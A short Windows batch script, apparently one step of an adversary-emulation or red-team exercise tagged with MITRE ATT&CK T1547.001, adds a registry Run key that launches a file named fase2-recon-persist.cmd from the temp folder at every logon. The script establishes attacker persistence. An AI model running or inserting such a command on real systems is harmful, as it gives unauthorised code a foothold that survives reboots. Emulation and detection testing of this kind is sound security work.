@echo off
REM Fase 2 – Persistencia mediante registro
REM Técnica: T1547.001 - Run keys / Startup folder

echo "Agregando clave de inicio al registro"
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Fase2_Persist" /t REG_SZ /d "%TEMP%\fase2-recon-persist.cmd" /f

echo "Persistencia configurada"
pause
